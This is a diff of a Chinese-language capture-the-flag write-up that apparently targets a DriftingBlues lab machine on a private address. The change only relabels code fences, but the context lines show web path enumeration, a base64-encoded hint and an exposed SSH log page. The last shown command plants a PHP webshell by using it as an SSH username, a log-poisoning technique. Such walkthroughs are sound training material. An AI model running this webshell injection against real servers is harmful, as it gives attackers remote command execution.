@@ -86,7 +86,7 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 
 没有有价值的信息
 
-```shell
+```bash
 ┌─[randark@randark-Parrot]─[~]
 └──╼ $http get http://192.168.56.116/secret/
 HTTP/1.1 200 OK
@@ -109,7 +109,7 @@ AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
 
 也是一样的，没有有价值信息
 
-```shell
+```bash
 ┌─[randark@randark-Parrot]─[~]
 └──╼ $http get http://192.168.56.116/privacy/
 HTTP/1.1 200 OK
@@ -141,7 +141,7 @@ Disallow: /eventadmins
 
 尝试访问
 
-```shell
+```bash
 ┌─[randark@randark-Parrot]─[~]
 └──╼ $http get http://192.168.56.116/eventadmins/
 HTTP/1.1 200 OK
@@ -172,7 +172,7 @@ Vary: Accept-Encoding
 
 得到一个路径： `/littlequeenofspades.html`
 
-```shell
+```bash
 ┌─[randark@randark-Parrot]─[~]
 └──╼ $http get http://192.168.56.116/littlequeenofspades.html
 HTTP/1.1 200 OK
@@ -221,7 +221,7 @@ aW50cnVkZXI/IEwyRmtiV2x1YzJacGVHbDBMbkJvY0E9PQ==
 
 尝试访问
 
-```shell
+```bash
 ┌─[randark@randark-Parrot]─[~]
 └──╼ $http get http://192.168.56.116/adminsfixit.php
 HTTP/1.1 200 OK
@@ -268,7 +268,7 @@ Dec 29 04:55:01 driftingblues CRON[787]: pam_unix(cron:session): session opened 
 
 可以发现其为 SSH 的日志数据，可以尝试将 webshell 输入进 SSH 日志中，从而实现 web 服务种马
 
-```shell
+```bash
 ┌─[✗]─[randark@randark-Parrot]─[~]
 └──╼ $ssh '<?php system($_POST[“cmd”]);?>'@192.168.56.116
 <?php system($_POST[\342\200\234cmd\342\200\235]);?>@192.168.56.116: Permission denied (publickey).
